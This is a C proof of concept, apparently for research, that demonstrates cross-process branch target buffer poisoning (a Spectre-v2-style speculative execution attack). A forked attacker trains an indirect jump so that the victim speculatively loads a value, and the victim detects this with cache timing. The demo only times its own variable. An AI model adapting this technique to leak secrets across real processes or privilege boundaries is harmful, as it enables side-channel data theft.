#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <stdbool.h>

#ifdef USEMSR
#include <assert.h>
#include <iostream>
#include "msr.hpp"
#endif

#define CPU_NO 5

extern int errno;

/*
 * Globals that will be used for purposes of the attack.
 */
unsigned int global_accessed_value = 5;
/*
 * This is required to keep the targets from 
 * being on the same cache line as the global_accessed_value
 * above. If this space does not exist, then 
 * loading the jump target will load the global_accessed_value
 * and defeat the entire purpose!
 */
unsigned long long i[128] = {5,};
void *jump_target = NULL;

/*
 * This is a function that makes it more convenient to 
 * invoke the rdstscp instruction.
 */
static inline __attribute__((always_inline)) unsigned long long rdtsc(void)
{
	unsigned hi, lo;
	__asm__ __volatile__ ("rdtscp;" : "=a"(lo), "=d"(hi) : : "ecx");
	return ( (unsigned long long)lo)|( ((unsigned long long)hi)<<32 );
}

unsigned long long attack(int target, int loop_max, const char *context) {
	unsigned long long before, after;
	register unsigned int fetched_accessed_value asm ("r12") = 0;

	switch (target) {
		case 1:
			jump_target = &&T1;
			global_accessed_value = 5;
			break;
		case 2:
			jump_target = &&T2;
			global_accessed_value = 6;
			break;
		}

	/*
	 * Start by flushing the global_accessed_value
	 * from the cache just in case.
	 */
	asm ("clflush %0; mfence\n" : : "m"(global_accessed_value));

	for (int i = 0; i<loop_max; i++)
	{
		/*
		 * At each iteration we flush the jump_target so that
		 * the speculative path has a chance to run ahead
		 * while the real target is beingn loaded into memory.
		 */
		asm ("clflush %0; mfence\n" : : "m"(jump_target));

		asm goto("jmp *%0\n" : /*output*/: "m"(jump_target) : : T1, T2);
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
		asm ("nop; nop; nop; nop;\n");
T1:
		/*
		 * The target of the attacker's jumps loads the value into memory.
		 */
		fetched_accessed_value = global_accessed_value;
		continue;
T2:
		/*
		 * The target of the victim's jumps does nothing.
		 */
		continue;
	}

	/*
	 * Time how long it takes to load the value from memory.
	 * The attacker's reported time will /always/ be the time to
	 * fetch a value from the cache because the entire pointn
	 * of its work is to repeatedly load the value. 
	 *
	 * The attacker will read from the cache if the attacker's target
	 * successfully biased its cache. Therefore, if the victim's
	 * time matches the attacker's time, the attack was successful.
	 */
	before = rdtsc();
	fetched_accessed_value = global_accessed_value;
	after = rdtsc();

	return after - before;
}

int main() {
	int attacker = 0;
	int target_max = 4;

	int attacker_to_victim_pipe[2] = {0,0};
	int victim_to_attacker_pipe[2] = {0,0};
	int p2c_write, p2c_read, c2p_write, c2p_read;
	char just_read = '\n';
	char to_write = 'W';

	unsigned long long totals = 0, fake = 0;
	unsigned int iterations = 0;
	unsigned int inner_iterations = 10;
	unsigned int counter = 1;

	float average = 0.0;

	cpu_set_t cpu_mask;

	CPU_ZERO(&cpu_mask);
	CPU_SET(CPU_NO, &cpu_mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &cpu_mask);

	if (pipe(attacker_to_victim_pipe) || pipe(victim_to_attacker_pipe)) {
		printf("Error with pipe(): %s\n", strerror(errno));
		return 1;
	}
	totals = 0.0;

	c2p_read = attacker_to_victim_pipe[0];
	c2p_write= attacker_to_victim_pipe[1];

	p2c_read = victim_to_attacker_pipe[0];
	p2c_write= victim_to_attacker_pipe[1];

/*
 * The attacker will jump to the branch of the
 * code that actually reads from the target.
 * The victim will jump to the branch of the
 * code that does nothing w.r.t. the target.
 *
 * When they both reconverge at a read of that
 * variable, they should both be reading from
 * the cache if the attack was successful.
 */
#define ATTACKER_TARGET 1
#define VICTIM_TARGET 2

	if (!(attacker = fork())) {
		for (int i = 0; i<counter; i++) {
			/*
			 * Wait for the go ahead from the
			 * victim.
			 */
			read(p2c_read, &just_read, 1);

			/*
			 * this call will bias the victim's btb
			 * and trick it into speculatively performing
			 * the load when it mispredicts the target
			 * of the jump.
			 */
			totals += attack(ATTACKER_TARGET, 100, "Child");

			/*
			 * Tell the victim that we are done working.
			 */
			write(c2p_write, &to_write, 1);

			iterations += 1;
		}
		average = (totals*1.0) / iterations;
		printf("attacker time per iteration: %f\n", average);
		return 0;
	}

	for (int i = 0; i<counter; i++) {
		/*
		 * Tell the attacker to start.
		 */
		write(p2c_write, &to_write, 1);
		/*
		 * Wait for the attacker to finish.
		 */
		read(c2p_read, &just_read, 1);

		/* 
		 * Now, the jump in the attack will get 
		 * mispredicted and it will speculatively
		 * load the memory before it gets resteered
		 * to the correct target.
		 */
		totals += attack(VICTIM_TARGET, 1, "Parent");
		iterations+=1;
	}

	average = (totals*1.0) / iterations;
	printf("victim time per iteration: %f\n", average);

	waitpid(attacker, NULL, 0);

	return 0;
}
